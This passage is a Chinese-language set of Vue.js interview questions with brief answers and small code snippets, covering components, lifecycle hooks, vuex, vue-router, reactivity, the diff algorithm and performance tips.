<h3 id="%E3%80%80%E3%80%80%E4%BB%80%E4%B9%88%E6%98%AF%E7%BB%84%E4%BB%B6%EF%BC%9F" style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">　</span><span style="color:#956fe7">　什么是组件？</span></span></h3> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">　　页面上</span></span><span style="color:#333333"><span style="background-color:#fefcd8">可以复用</span></span><span style="background-color:#f8f8f8"><span style="color:#333333">的都称之为组件 它是 HTML、CSS、JS 的聚合体。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">　　组件就相当于库，把一些能在项目里或者不同项目里可以复用的代码进行需求性的封装。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">　　组件中的 data 为什么是一个函数？</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">　　让每个返回的实例都可以维护一份被返回对象的独立的拷贝。</span></span></p> 
<h2 id="10.ajax%E8%AF%B7%E6%B1%82%E5%BA%94%E8%AF%A5%E6%94%BE%E5%9C%A8%E5%93%AA%E4%B8%AA%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%EF%BC%9F" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">10.ajax请求应该放在哪个生命周期？</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">mounted，因为js是单线程，ajax异步获取数据</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"></p> 
<h2 id="11.%E5%A6%82%E4%BD%95%E5%B0%86%E7%BB%84%E4%BB%B6%E6%89%80%E6%9C%89props%E4%BC%A0%E9%80%92%E7%BB%99%E5%AD%90%E7%BB%84%E4%BB%B6%EF%BC%9F" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">11.如何将组件所有props传递给子组件？</span></h2> 
<p><span style="background-color:#f8f8f8"><span style="color:#333333">父组件绑定一个自定义属性变量，然后子组件通过props使用这个变量即可。</span></span></p> 
<h2 id="12.%E5%A6%82%E4%BD%95%E8%87%AA%E5%AE%9A%E5%AE%9E%E7%8E%B0v-model%3F" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">12.如何自定实现v-model?</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">我们定义了model对象。model对象包含两个属性，一个是prop，一个是event。prop值text1，event的值change1，我们这里写model是为了改变默认的东西，使用我们自己定义的变量。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">&lt;input type="text"  :value="text1"   @input="$emit('change1', $event.target.value)" &gt;</span></span></p> 
<h2 id="13.%E5%A4%9A%E4%B8%AA%E7%BB%84%E4%BB%B6%E6%9C%89%E7%9B%B8%E5%90%8C%E9%80%BB%E8%BE%91%EF%BC%8C%E5%A6%82%E4%BD%95%E6%8A%BD%E7%A6%BB%EF%BC%9F" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">13.多个组件有相同逻辑，如何抽离？</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">使用mixin 对公共部分的逻辑进行抽离</span></span></p> 
<h2 id="14.%E4%BD%95%E6%97%B6%E8%A6%81%E4%BD%BF%E7%94%A8%E5%BC%82%E6%AD%A5%E7%BB%84%E4%BB%B6%EF%BC%9F" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">14.何时要使用异步组件？</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">加载大组件，路由异步加载</span></span></p> 
<h2 id="15.%E4%BD%95%E6%97%B6%E4%BD%BF%E7%94%A8keep-alive%EF%BC%9F" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">15.何时使用keep-alive？</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">缓存组件不需要重复渲染，多个静态tab页切换，优化性能</span></span></p> 
<h2 id="16.%E4%BD%95%E6%97%B6%E4%BD%BF%E7%94%A8beforeDestroy%EF%BC%9F" style="margin-left:.0001pt;text-align:left"><span style="color:#956fe7">16.何时使用beforeDestroy？</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">1.解绑自定义事件event.$off</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">2.清除定时器</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">3.解绑自定义dom事件，如windom.scroll等</span></span></p> 
<h2 id="17.%E4%BB%80%E4%B9%88%E6%98%AF%E4%BD%9C%E7%94%A8%E5%9F%9F%E6%8F%92%E6%A7%BD%EF%BC%9F" style="margin-left:.0001pt;text-align:left"><span style="color:#ffd900">17.什么是作用域插槽？</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">在solt组件中有自己的data，把它传给使用的地方</span></span></p> 
<h2 id="18.vuex%E4%B8%ADaction%E5%92%8Cmutation%E6%9C%89%E4%BD%95%E5%8C%BA%E5%88%AB%EF%BC%9F" style="margin-left:.0001pt;text-align:left"><span style="color:#fe2c24">18.vuex中action和mutation有何区别？</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">action中处理异步，mutation不可以</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">mutation做原子操作，action2可以整合多个mutation</span></span></p> 
<h2 id="19.vue-router%E5%B8%B8%E7%94%A8%E8%B7%AF%E7%94%B1%E6%A8%A1%E5%BC%8F" style="margin-left:.0001pt;text-align:left"><span style="color:#956fe7">19.vue-router常用路由模式</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">hash默认，h5 histroy需要服务端支持</span></span></p> 
<h2 id="20.%E5%A6%82%E4%BD%95%E9%85%8D%E7%BD%AEvue-router%E5%BC%82%E6%AD%A5%E5%8A%A0%E8%BD%BD" style="margin-left:.0001pt;text-align:left"><span style="color:#a2e043">20.如何配置vue-router异步加载</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">component:() =&gt; import('./component')</span></span></p> 
<h2 id="21.%E8%AF%B7%E7%94%A8vnode%E6%8F%8F%E8%BF%B0%E4%B8%80%E4%B8%AAdom%E7%BB%93%E6%9E%84" style="margin-left:.0001pt;text-align:left"><span style="color:#fe2c24">21.请用vnode描述一个dom结构</span></h2> 
<pre><code>&lt;ul id='test'&gt;

&lt;p class='hehe'&gt;这里是p标签&lt;/p&gt;

&lt;li&gt;{<!-- -->{1+1}}&lt;/li&gt;

&lt;/ul&gt;

let vdom={

    tag:'ul',

    props:{

     id:'test'

    },

    children:[

     {

     tag:'p',

     props:{

     class:'hehe'

     },

     children:'这里是p标签'

     },

     {

     tag:'li',

     children:1

     }

    ]

}</code></pre> 
<h2 id="22.%E7%9B%91%E5%90%ACdata%E5%8F%98%E5%8C%96%E7%9A%84%E6%A0%B8%E5%BF%83api%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">22.监听data变化的核心api是什么？</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">vue2.0核心api是Object.defineProperty，vue3.0是启用provy实现响应式</span></span></p> 
<h2 id="23.vue%E5%A6%82%E4%BD%95%E7%9B%91%E5%90%AC%E6%95%B0%E6%8D%AE%E5%8F%98%E5%8C%96%EF%BC%9F" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">23.vue如何监听数据变化？</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">vue中的watch监听数据变化</span></span></p> 
<h2 id="24.%E8%AF%B7%E6%8F%8F%E8%BF%B0%E5%93%8D%E5%BA%94%E5%BC%8F%E5%8E%9F%E7%90%86%EF%BC%9F" style="margin-left:.0001pt;text-align:left"><span style="color:#a2e043">24.请描述响应式原理？</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#956fe7"><span style="background-color:#f8f8f8">1.描述监听data变化</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">监听对象变化：vue2.0核心api是Object.defineProperty，vue3.0是启用provy实现响应式</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">监听数组变化：重写数组的push.pop.shift.unshift.splice.sort.reverse方法</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#956fe7"><span style="background-color:#f8f8f8">2.组件渲染和更新的过程(面试题5)</span></span></p> 
<h2 id="25.%E7%AE%80%E8%BF%B0diff%E7%AE%97%E6%B3%95%E8%BF%87%E7%A8%8B%EF%BC%88%E4%BA%86%E8%A7%A3%EF%BC%89" style="margin-left:.0001pt;text-align:left"><span style="color:#333333">25.简述diff算法过程（了解）</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">在执行Diff算法的过程就是调用名为 patch 的函数，比较新旧节点。一边比较一边给真实的 DOM 打补丁。patch 函数接收两个参数 oldVnode 和 Vnode，它们分别代表新的节点和之前的旧节点。这个patch函数会比较 oldVnode 和 vnode 是否是相同的, 即函数 sameVnode(oldVnode, vnode), 根据这个函数的返回结果分如下两种情况：</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">true：则执行 patchVnode</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">false：则用 vnode 替换 oldVnode</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">//对比过程</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">找到对应的真实 dom，称为 el</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">判断 vnode 和 oldVnode 是否指向同一个对象。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">如果是，那么直接 return。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">如果他们都有文本节点并且不相等，那么将 el 的文本节点设置为 vnode 的文本节点。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">如果 oldVnode 有子节点而 vnode 没有，则删除 el 的子节点。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">如果 oldVnode 没有子节点而 vnode 有，则将 vnode 的子节点真实化之后添加到 el</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">如果两者都有子节点，则执行 updateChildren 函数比较子节点。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"></p> 
<h2 id="26.vue%E4%B8%BA%E4%BD%95%E6%98%AF%E5%BC%82%E6%AD%A5%E6%B8%B2%E6%9F%93%EF%BC%8C%24nextTick%E4%BD%95%E7%94%A8%EF%BC%9F" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">26.vue为何是异步渲染，$nextTick何用？</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">因为如果不采用异步更新，那么每次更新数据都会对当前组件进行重新渲染，所以考虑性能问题，Vue会在本轮数据更新之后，再去异步更新视图</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">$nextTick 是在下次 DOM 更新循环结束之后执行延迟回调，在修改数据之后使用 $nextTick，则可以在回调中获取更新后的 DOM</span></span></p> 
<h2 id="27.vue%E5%B8%B8%E8%A7%81%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E6%96%B9%E5%BC%8F%EF%BC%9F" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">27.vue常见性能优化方式？</span></h2> 
<h3 id="1.%E5%90%88%E7%90%86%E4%BD%BF%E7%94%A8v-if%E5%92%8Cv-show%EF%BC%8C" style="margin-left:.0001pt;text-align:left"><span style="color:#a2e043"><span style="background-color:#f8f8f8">1.合理使用v-if和v-show，</span></span></h3> 
<h3 id="2.%E5%90%88%E7%90%86%E4%BD%BF%E7%94%A8computed%EF%BC%8C" style="margin-left:.0001pt;text-align:left"><span style="color:#a2e043"><span style="background-color:#f8f8f8">2.合理使用computed，</span></span></h3> 
<h3 id="3.v-for%E5%8A%A0key%EF%BC%8C" style="margin-left:.0001pt;text-align:left"><span style="color:#a2e043"><span style="background-color:#f8f8f8">3.v-for加key，</span></span></h3> 
<h3 id="4.%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BA%8B%E4%BB%B6%EF%BC%8Cdom%E4%BA%8B%E4%BB%B6%E5%8F%8A%E6%97%B6%E9%94%80%E6%AF%81%EF%BC%8C" style="margin-left:.0001pt;text-align:left"><span style="color:#a2e043"><span style="background-color:#f8f8f8">4.自定义事件，dom事件及时销毁，</span></span></h3> 
<h3 id="5.%E5%90%88%E7%90%86%E4%BD%BF%E7%94%A8%E5%BC%82%E6%AD%A5%E7%BB%84%E4%BB%B6%EF%BC%8C" style="margin-left:.0001pt;text-align:left"><span style="color:#a2e043"><span style="background-color:#f8f8f8">5.合理使用异步组件，</span></span></h3> 
<h3 id="6.%E5%90%88%E7%90%86%E4%BD%BF%E7%94%A8keepalive%EF%BC%8C" style="margin-left:.0001pt;text-align:left"><span style="color:#a2e043"><span style="background-color:#f8f8f8">6.合理使用keepalive，</span></span></h3> 
<h3 id="7.data%E5%B1%82%E7%BA%A7%E4%B8%8D%E8%A6%81%E5%A4%AA%E6%B7%B1%EF%BC%8C" style="margin-left:.0001pt;text-align:left"><span style="color:#a2e043"><span style="background-color:#f8f8f8">7.data层级不要太深，</span></span></h3> 
<h3 id="8.%E4%BD%BF%E7%94%A8vue-loader%E5%9C%A8%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%81%9A%E6%A8%A1%E6%9D%BF%E7%BC%96%E8%AF%91%EF%BC%8C" style="margin-left:.0001pt;text-align:left"><span style="color:#a2e043"><span style="background-color:#f8f8f8">8.使用vue-loader在开发环境做模板编译，</span></span></h3> 
<h3 id="9.%E5%89%8D%E7%AB%AF%E9%80%9A%E7%94%A8%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%EF%BC%88%E5%A6%82%E5%9B%BE%E7%89%87%E6%87%92%E5%8A%A0%E8%BD%BD%2F%E5%87%8F%E5%B0%91%20HTTP%E8%AF%B7%E6%B1%82%E6%95%B0%2F%E5%90%88%E7%90%86%E8%AE%BE%E7%BD%AE%20HTTP%E7%BC%93%E5%AD%98%2F%E8%B5%84%E6%BA%90%E5%90%88%E5%B9%B6%E4%B8%8E%E5%8E%8B%E7%BC%A9%2F%E5%90%88%E5%B9%B6%20CSS%E5%9B%BE%E7%89%87%2F%E5%B0%86%20CSS%E6%94%BE%E5%9C%A8%20head%E4%B8%AD%2F%E9%81%BF%E5%85%8D%E9%87%8D%E5%A4%8D%E7%9A%84%E8%B5%84%E6%BA%90%E8%AF%B7%E6%B1%82%2F%E5%88%87%E5%88%86%E5%88%B0%E5%A4%9A%E4%B8%AA%E5%9F%9F%E5%90%8D%EF%BC%89%EF%BC%8C" style="margin-left:.0001pt;text-align:left"><span style="color:#a2e043"><span style="background-color:#f8f8f8">9.前端通用性能优化（如图片懒加载/减少 HTTP请求数/合理设置 HTTP缓存/资源合并与压缩/合并 CSS图片/将 CSS放在 head中/避免重复的资源请求/切分到多个域名），</span></span></h3> 
<h3 id="10.%E4%BD%BF%E7%94%A8ssr" style="margin-left:.0001pt;text-align:left"><span style="color:#a2e043"><span style="background-color:#f8f8f8">10.使用ssr</span></span></h3> 
<h2 id="28%E3%80%81VUEX%20%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%E6%80%8E%E4%B9%88%E4%BD%BF%E7%94%A8%EF%BC%9F%E9%82%A3%E7%A7%8D%E5%9C%BA%E5%90%88%E8%83%BD%E7%94%A8%EF%BC%9F" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">28、VUEX 是什么？怎么使用？那种场合能用？</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">vuex 是一个专门为 vue 构建的状态管理工具，主要是为了解决 多组间之间状态共享问题。强调的是集中式管理，（组件与组件之间的关系变成了组件与仓库之间的关系）</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">vuex 的核心包括：state（存放状态）、mutations（同步的更改状态）、actions（发送异步请求，拿到数据）、getters（根据之前的状态派发新的状态）、modules（模块划分）</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">state 发布一条新的数据，在 getters 里面根据状态派发新的状态，actions 发送异步请求获取数据，然后在 mutations 里面同步的更改数据</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">　　应用场合：购物车的数据共享、登入注册</span></span></p> 
<h2 id="29%E3%80%81vue%20%E7%9A%84%E6%8C%87%E4%BB%A4%E7%94%A8%E6%B3%95" style="margin-left:.0001pt;text-align:left"><span style="color:#956fe7">29、vue 的指令用法</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">v-html   //html</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">v-text   //元素里要显示的内容</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">v-bind：data    //绑定动态数据   ：data</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">v-on：click      //绑定事件       @click</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">v-for</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">v-if //条件渲染指令</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">v-model    //双向绑定，用于表单</span></span></p> 
<h2 id="30%E3%80%81vue.js%E7%9A%84%E4%B8%A4%E4%B8%AA%E6%A0%B8%E5%BF%83%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">30、vue.js的两个核心是什么？</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#956fe7"><span style="background-color:#f8f8f8">数据驱动和组件化</span></span></p> 
<h2 id="31.vue%E4%B8%AD%E5%AD%90%E7%BB%84%E4%BB%B6%E8%B0%83%E7%94%A8%E7%88%B6%E7%BB%84%E4%BB%B6%E7%9A%84%E6%96%B9%E6%B3%95%3F" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">31.vue中子组件调用父组件的方法?</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">1.直接在子组件中通过this.$parent.event来调用父组件的方法。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">2.在子组件里用$emit向父组件触发一个事件，父组件监听这个事件就行了。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">3.父组件把方法传入子组件中，在子组件里直接调用这个方法。</span></span></p> 
<h2 id="32.vue%E4%B8%AD%E7%88%B6%E7%BB%84%E4%BB%B6%E8%B0%83%E7%94%A8%E5%AD%90%E7%BB%84%E4%BB%B6%E7%9A%84%E6%96%B9%E6%B3%95%3F" style="margin-left:.0001pt;text-align:left"><span style="color:#956fe7">32.vue中父组件调用子组件的方法?</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">父组件利用ref属性操作子组件方法。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">父：</span></span></p> 
<pre><code>&lt;child ref="childMethod"&gt;&lt;/child&gt;</code></pre> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">子：</span></span></p> 
<pre><code>method: {

  test() {

     alert(1)

  }

}</code></pre> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">在父组件里调用test即 this.$refs.childMethod.test()</span></span></p> 
<h2 id="33.vue%E9%A1%B5%E9%9D%A2%E7%BA%A7%E7%BB%84%E4%BB%B6%E4%B9%8B%E9%97%B4%E4%BC%A0%E5%80%BC%3F" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">33.vue页面级组件之间传值?</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">    1.使用vue-router通过跳转链接带参数传参。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">    2.使用本地缓存localStorge。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">    3.使用vuex数据管理传值</span></span></p> 
<h2 id="34.%E8%AF%B4%E8%AF%B4vue%E7%9A%84%E5%8A%A8%E6%80%81%E7%BB%84%E4%BB%B6%E3%80%82" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">34.说说vue的动态组件。</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333"> 多个组件通过同一个挂载点进行组件的切换，is的值是哪个组件的名称，那么页面就会显示哪个组件。</span></span></p> 
<h2 id="35.%24route%E5%92%8C%20%24router%E7%9A%84%E5%8C%BA%E5%88%AB%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F" style="margin-left:.0001pt;text-align:left"><span style="color:#956fe7">35.$route和 $router的区别是什么？</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333"> $router为VueRouter的实例，是一个全局路由对象，包含了路由跳转的方法、钩子函数等。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333"> $route 是路由信息对象||跳转的路由对象，每一个路由都会有一个route对象，是一个局部对象，包含path,params,hash,query,fullPath,matched,name等路由信息参数。</span></span></p> 
<h2 id="36.%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%BF%E7%94%A8vue%E5%BC%80%E5%8F%91%EF%BC%9F" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">36.为什么使用vue开发？</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">组件化开发 单页面路由 丰富的Api方法 双向的数据绑定 单向数据流 易于结合其他第三库</span></span></p> 
<h2 id="37.vue%E5%92%8Creact%20%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%EF%BC%9F" style="margin-left:.0001pt;text-align:left"><span style="color:#956fe7">37.vue和react 有什么区别？</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">1、监听数据变化的实现原理不同**</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">2、数据流的不同**</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">3、HoC和mixins**</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">4、组件通信的区别**</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">5、模板渲染方式的不同**</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">6、渲染过程不同**</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">7、框架本质不同**</span></span></p> 
<h2 id="38.Vuex%E5%92%8CRedux%E7%9A%84%E5%8C%BA%E5%88%AB" style="margin-left:.0001pt;text-align:left"><span style="color:#956fe7">38.Vuex和Redux的区别</span></h2> 
<h3 id="mvvm%E5%92%8Cmvc%E7%90%86%E8%A7%A3%20%E4%B8%8E%E5%8C%BA%E5%88%AB%EF%BC%9F" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0"><span style="background-color:#f8f8f8">mvvm和mvc理解 与区别？</span></span></h3> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">View 将请求转交---&gt; Controlle  处理 ---&gt;Model数据更新保存 -----&gt;View视图显示</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">View 接受用户交互请求</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">View 将请求转交给Controller处理</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">Controller 操作Model进行数据更新保存</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">数据更新保存之后，Model会通知View更新</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">View 更新变化数据使用户得到反馈 </span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">MVVM即Model-View-ViewModel，将其中的 View 的状态和行为抽象化，让我们可以将UI和业务逻辑分开。MVVM的优点是低耦合、可重用性、独立开发。 </span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">View 接收用户交互请求</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">View 将请求转交给ViewModel</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">ViewModel 操作Model数据更新</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">Model 更新完数据，通知ViewModel数据发生变化</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">ViewModel 更新View数据 </span></span></p> 
<h2 id="39.%E8%AF%B4%E4%B8%80%E4%B8%8Bvue%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%2F%E9%92%A9%E5%AD%90%E5%87%BD%E6%95%B0%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9F" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">39.说一下vue的生命周期/钩子函数都有哪些？</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#956fe7"><span style="background-color:#f8f8f8">单组件声明周期图</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">挂载： beforeCreate =&gt; created =&gt; beforeMount =&gt; mounted</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">更新： beforeUpdate =&gt; updated</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">销毁： beforeDestroy =&gt; destroyed</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">父子组件生命周期图</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">挂载： parent beforeCreate =&gt; parent created =&gt; parent beforeMount =&gt; child beforeCreate =&gt; child created =&gt; child beforeMount =&gt; child mounted =&gt; parent mounted</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">更新： parent beforeUpdate =&gt; child beforeUpdate =&gt; child updated =&gt; parent updated</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">销毁： parent beforeDestroy =&gt; child beforeDestroy =&gt; child destroyed =&gt; parent destroyed</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">从以上能够看出：</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">挂载时，子组件是在父组件before mount后开始挂载，并且子组件先mounted，父组件随后</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">更新时，子组件是在父组件before update后开始更新，子组件先于父组件更新</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">销毁时，子组件是在父组件before destroy后开始销毁，并且是子组件先销毁，父组件随后。</span></span></p> 
